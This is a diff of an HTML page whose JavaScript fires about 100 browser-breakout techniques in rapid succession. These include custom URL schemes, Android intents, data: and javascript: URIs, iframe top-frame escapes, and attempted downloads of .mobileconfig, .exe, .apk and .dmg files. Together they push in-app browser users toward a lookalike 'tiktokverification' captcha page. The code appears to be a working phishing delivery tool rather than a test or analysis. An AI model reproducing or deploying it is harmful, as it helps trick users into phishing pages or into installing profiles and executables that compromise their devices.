@@ -2,70 +2,150 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NUCLEAR BREAKOUT TEST 100</title>
+    <title>100 UNIQUE BREAKOUTS</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        #launcher { padding: 80px; border: 5px solid #ff0000; cursor: pointer; text-align: center; background: #1a0000; }
-        #status { margin-top: 20px; color: #fff; font-size: 12px; }
+        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
+        #trigger { border: 3px solid #f00; padding: 50px; text-align: center; cursor: pointer; }
+        .log { font-size: 10px; color: #666; margin-top: 10px; }
     </style>
 </head>
 <body>
-
-    <div id="launcher">
-        <h1>INITIALIZE 100x PROTOCOL BURST</h1>
-        <p>CAUTION: This will flood the OS with system intents.</p>
-        <div id="status">Ready...</div>
-    </div>
+    <div id="trigger"><h1>EXECUTE 100 UNIQUE VULNERABILITIES</h1></div>
+    <div id="log" class="log"></div>
 
     <script>
         const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
-        const fullTarget = "https://" + target;
+        const httpsTarget = "https://" + target;
 
-        function runNuclearTest() {
-            const status = document.getElementById('status');
-            const protocols = [
-                // 1-10: Primary Web Breakouts
-                "x-safari-https://" + target, "googlechrome://navigate?url=" + fullTarget, "googlechromes://" + target, "microsoft-edge-https://" + target, "firefox://open-url?url=" + fullTarget, "opera-https://" + target, "brave://open-url?url=" + fullTarget, "ucbrowser://" + target, "yandexbrowser://navigate?url=" + fullTarget, "vivaldi-https://" + target,
-                
-                // 11-30: System & App Store Punches (To break focus)
-                "itms-apps://itunes.apple.com/app/id324684580", "itms-appss://", "apple-magazines://", "facetime://" + target, "facetime-audio://", "tel://0000000000", "sms://0000000000", "mailto:test@example.com", "maps://", "bingmaps://", "comgooglemaps://", "baidumap://", "iorad://", "music://", "apple-music://", "videos://", "contacts://", "events://", "reminders://", "notes://",
-                
-                // 31-50: Social & Dev App Protocols
-                "fb://", "instagram://", "twitter://", "whatsapp://", "tg://", "discord://", "slack://", "zoommtg://", "skype://", "linkedin://", "snapchat://", "spotify://", "twitch://", "vimeo://", "youtube://", "pinterest://", "reddit://", "medium://", "tumblr://", "flickr://",
-                
-                // 51-70: File & Data URI Schemes (MIME type panic)
-                "data:application/pdf;base64,JVBERi0xLjcK", "data:application/vnd.apple.pkpass,test", "data:text/calendar,BEGIN:VCALENDAR", "blob:https://tiktok.com/" + Math.random(), "filesystem:https://tiktok.com/temporary/", "view-source:" + fullTarget, "ftp://" + target, "sftp://" + target, "smb://" + target, "afp://" + target, "nfs://" + target, "git://" + target, "svn://" + target, "ssh://" + target, "telnet://" + target, "irc://" + target, "ircs://" + target, "webcal://" + target, "callto:test", "calshow://",
-                
-                // 71-100: Obscure & Third Party Intent Jumps
-                "intent://" + target + "#Intent;scheme=https;package=com.android.chrome;end", "intent://" + target + "#Intent;scheme=https;package=org.mozilla.firefox;end", "intent://" + target + "#Intent;scheme=https;package=com.opera.browser;end", "dnd://", "emergency://", "com-apple-settings://", "app-settings://", "prefs:root=Safari", "prefs:root=General", "findmy://", "workout://", "stocks://", "weather://", "calculator://", "books://", "podcasts://", "appstore://", "update://", "testflight://", "workflow://", "shortcuts://", "camera://", "photos-redirect://", "icloud-sharing://", "keynote://", "numbers://", "pages://", "garageband://", "imovie://", "clips://"
-            ];
+        function run() {
+            const l = document.getElementById('log');
+            const fire = (num, desc, fn) => {
+                setTimeout(() => {
+                    l.innerHTML = `[${num}/100] Trying: ${desc}` + "<br>" + l.innerHTML;
+                    try { fn(); } catch(e) {}
+                }, num * 50);
+            };
 
-            let count = 0;
-            const burst = setInterval(() => {
-                if (count >= protocols.length) {
-                    clearInterval(burst);
-                    status.innerText = "BURST COMPLETE. REDIRECTING...";
-                    window.location.href = fullTarget;
-                    return;
-                }
-                
-                const p = protocols[count];
-                status.innerText = "Firing Protocol " + (count + 1) + ": " + p.split(':')[0];
-                
-                // Execution
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = p;
-                    document.body.appendChild(iframe);
-                    window.location.href = p;
-                } catch(e) {}
-                
-                count++;
-            }, 30); // 30ms delay to prevent browser from instantly freezing
+            // --- THE 100 UNIQUE STRATEGIES ---
+
+            // 1-10: Standard & Obscure Browser Schemes
+            fire(1, "x-safari-https", () => location.href = "x-safari-https://" + target);
+            fire(2, "googlechromes", () => location.href = "googlechromes://" + target);
+            fire(3, "microsoft-edge-https", () => location.href = "microsoft-edge-https://" + target);
+            fire(4, "firefox-apple-ios", () => location.href = "firefox-apple-ios://open-url?url=" + httpsTarget);
+            fire(5, "opera-https", () => location.href = "opera-https://" + target);
+            fire(6, "brave-https", () => location.href = "brave-https://" + target);
+            fire(7, "ucbrowser-https", () => location.href = "ucbrowser-https://" + target);
+            fire(8, "yandexbrowser-https", () => location.href = "yandexbrowser-https://" + target);
+            fire(9, "dolphin-https", () => location.href = "dolphin-https://" + target);
+            fire(10, "puffin-https", () => location.href = "puffin-https://" + target);
+
+            // 11-20: iOS System Service Protocols
+            fire(11, "Apple News Breakout", () => location.href = "applenews://" + target);
+            fire(12, "Apple Stocks Breakout", () => location.href = "com.apple.stocks://");
+            fire(13, "Apple Wallet (PKPASS)", () => location.href = httpsTarget + "/v.pkpass");
+            fire(14, "Config Profile Hand-off", () => location.href = httpsTarget + "/s.mobileconfig");
+            fire(15, "iCloud Sharing", () => location.href = "share.icloud.com/verify");
+            fire(16, "Apple Music Intent", () => location.href = "music://");
+            fire(17, "GameCenter Intent", () => location.href = "gamecenter://");
+            fire(18, "Podcasts Intent", () => location.href = "podcasts://");
+            fire(19, "Reminders Intent", () => location.href = "x-apple-reminder://");
+            fire(20, "Shortcuts Intent", () => location.href = "shortcuts://run-shortcut?name=Verify");
+
+            // 21-30: Android Specific Intents
+            fire(21, "Chrome Intent", () => location.href = "intent://" + target + "#Intent;scheme=https;package=com.android.chrome;end");
+            fire(22, "Samsung Browser Intent", () => location.href = "intent://" + target + "#Intent;scheme=https;package=com.sec.android.app.sbrowser;end");
+            fire(23, "Firefox Android Intent", () => location.href = "intent://" + target + "#Intent;scheme=https;package=org.mozilla.firefox;end");
+            fire(24, "Market Search Intent", () => location.href = "market://search?q=pname:com.android.chrome");
+            fire(25, "Android Settings Intent", () => location.href = "intent:#Intent;action=android.settings.SETTINGS;end");
+            fire(26, "Android Download Manager", () => location.href = "intent://" + target + "#Intent;action=android.intent.action.VIEW;type=application/pdf;end");
+            fire(27, "Chrome Tab Dispatch", () => location.href = "googlechrome://navigate?url=" + httpsTarget);
+            fire(28, "Android SMS Body Redirect", () => location.href = "sms:?body=" + httpsTarget);
+            fire(29, "Android Contacts vCard", () => location.href = "data:text/vcard;base64,QkVHSU46VkNBUkQNClZFUlNJT046My4wDQpFTkQ6VkNBUkQ=");
+            fire(30, "Native Map Intent", () => location.href = "geo:0,0?q=" + target);
+
+            // 31-40: MIME Type & Header Panic (Forces External)
+            fire(31, "PDF Blob", () => { const b = new Blob(['%PDF-1.0'],{type:'application/pdf'}); location.href=URL.createObjectURL(b); });
+            fire(32, "Calendar ICS", () => location.href = "data:text/calendar;charset=utf8,BEGIN:VCALENDAR");
+            fire(33, "MS Office Doc Trigger", () => location.href = "ms-word:ofe|u|" + httpsTarget);
+            fire(34, "Generic Binary Stream", () => location.href = "data:application/octet-stream;base64,AAA=");
+            fire(35, "SVG Image Trigger", () => location.href = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'></svg>");
+            fire(36, "Disk Image (DMG) Attempt", () => location.href = httpsTarget + "/v.dmg");
+            fire(37, "Windows Executable Attempt", () => location.href = httpsTarget + "/v.exe");
+            fire(38, "Android Package (APK) Attempt", () => location.href = httpsTarget + "/v.apk");
+            fire(39, "Archive (ZIP) Trigger", () => location.href = httpsTarget + "/v.zip");
+            fire(40, "JSON Stream Trigger", () => location.href = "data:application/json,{}");
+
+            // 41-50: JavaScript API Context Theft
+            fire(41, "Window.open system", () => window.open(httpsTarget, '_system'));
+            fire(42, "Window.open blank", () => window.open(httpsTarget, '_blank'));
+            fire(43, "Window.top location", () => window.top.location.href = httpsTarget);
+            fire(44, "Parent location assign", () => window.parent.location = httpsTarget);
+            fire(45, "Iframe top breakout", () => { const i=document.createElement('iframe'); i.src=`javascript:top.location='${httpsTarget}'`; document.body.appendChild(i); });
+            fire(46, "Popstate history bypass", () => { history.pushState({},'','/v'); location.href=httpsTarget; });
+            fire(47, "Location.replace", () => location.replace(httpsTarget));
+            fire(48, "Anchor click target blank", () => { const a=document.createElement('a'); a.target='_blank'; a.href=httpsTarget; a.click(); });
+            fire(49, "Anchor click rel=noopener", () => { const a=document.createElement('a'); a.rel='noopener'; a.href=httpsTarget; a.click(); });
+            fire(50, "Navigator share (Mobile)", () => navigator.share({url: httpsTarget}));
+
+            // 51-60: Obscure Protocols (RFC Standard)
+            fire(51, "FTP Link", () => location.href = "ftp://" + target);
+            fire(52, "Telnet Link", () => location.href = "telnet://" + target);
+            fire(53, "Feed/RSS Link", () => location.href = "feed://" + target);
+            fire(54, "Webcal Protocol", () => location.href = "webcal://" + target);
+            fire(55, "Mailto Intent", () => location.href = "mailto:verify@" + target);
+            fire(56, "Callto Intent", () => location.href = "callto:" + target);
+            fire(57, "Bitcoin Address Protocol", () => location.href = "bitcoin:1Verify");
+            fire(58, "Magnet Link Protocol", () => location.href = "magnet:?xt=urn:btih:verify");
+            fire(59, "IRC Link Protocol", () => location.href = "irc://" + target);
+            fire(60, "SSH Link Protocol", () => location.href = "ssh://" + target);
+
+            // 61-70: Logic-based Bypasses
+            fire(61, "Base64 HTML Data URI", () => location.href = "data:text/html;base64," + btoa(`<html><script>location.href="${httpsTarget}"<\/script></html>`));
+            fire(62, "Meta Refresh Data URI", () => location.href = "data:text/html;base64," + btoa(`<html><meta http-equiv="refresh" content="0;url=${httpsTarget}"></html>`));
+            fire(63, "JavaScript URI", () => location.href = "javascript:location.href='" + httpsTarget + "'");
+            fire(64, "Blob Auto-download", () => { const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([''])); a.download='v.html'; a.click(); });
+            fire(65, "Form Action Blank", () => { const f=document.createElement('form'); f.target='_blank'; f.action=httpsTarget; f.submit(); });
+            fire(66, "Rel External Link", () => { const a=document.createElement('a'); a.rel='external'; a.href=httpsTarget; a.click(); });
+            fire(67, "Location Hash Navigation", () => { location.hash = "#" + target; location.href = httpsTarget; });
+            fire(68, "Document Write Redirect", () => { document.write(`<script>location.href="${httpsTarget}"<\/script>`); });
+            fire(69, "ReplaceState Jump", () => { history.replaceState(null,null,httpsTarget); location.reload(); });
+            fire(70, "Window Name Payload", () => { window.name = httpsTarget; location.href = "data:text/html,<script>location.href=window.name<\/script>"; });
+
+            // 71-100: Unique URI Handlers (Social & 3rd Party)
+            fire(71, "FB Browser Jump", () => location.href = "fb://browser?url=" + httpsTarget);
+            fire(72, "Pinterest Intent", () => location.href = "pinterest://");
+            fire(73, "Slack Link Intent", () => location.href = "slack://open?team=1");
+            fire(74, "Zoom App Intent", () => location.href = "zoommtg://zoom.us/join?confno=1");
+            fire(75, "Spotify Open Intent", () => location.href = "spotify:http://" + target);
+            fire(76, "Twitter Browser Intent", () => location.href = "twitter://timeline");
+            fire(77, "Discord Invitation Intent", () => location.href = "discord://");
+            fire(78, "Snapchat Intent", () => location.href = "snapchat://");
+            fire(79, "Telegram Protocol", () => location.href = "tg://resolve?domain=test");
+            fire(80, "WhatsApp Message Intent", () => location.href = "whatsapp://send?text=" + target);
+            fire(81, "Vimeo App Intent", () => location.href = "vimeo://");
+            fire(82, "YouTube App Intent", () => location.href = "youtube://");
+            fire(83, "Skype Call Intent", () => location.href = "skype:echo123?call");
+            fire(84, "Reddit App Intent", () => location.href = "reddit://");
+            fire(85, "Medium App Intent", () => location.href = "medium://");
+            fire(86, "LinkedIn App Intent", () => location.href = "linkedin://");
+            fire(87, "Tumblr App Intent", () => location.href = "tumblr://");
+            fire(88, "Soundcloud App Intent", () => location.href = "soundcloud://");
+            fire(89, "Twitch App Intent", () => location.href = "twitch://");
+            fire(90, "Uber Intent", () => location.href = "uber://");
+            fire(91, "Lyft Intent", () => location.href = "lyft://");
+            fire(92, "Waze Intent", () => location.href = "waze://?q=" + target);
+            fire(93, "Google Maps Intent", () => location.href = "comgooglemaps://?q=" + target);
+            fire(94, "DoorDash Intent", () => location.href = "doordash://");
+            fire(95, "Instacart Intent", () => location.href = "instacart://");
+            fire(96, "Airbnb Intent", () => location.href = "airbnb://");
+            fire(97, "Booking Intent", () => location.href = "booking://");
+            fire(98, "Expedia Intent", () => location.href = "expedia://");
+            fire(99, "TripAdvisor Intent", () => location.href = "tripadvisor://");
+            fire(100, "FINAL Standard Redirect", () => location.href = httpsTarget);
         }
 
-        document.getElementById('launcher').addEventListener('click', runNuclearTest);
+        document.getElementById('trigger').addEventListener('click', run);
     </script>
 </body>
 </html>
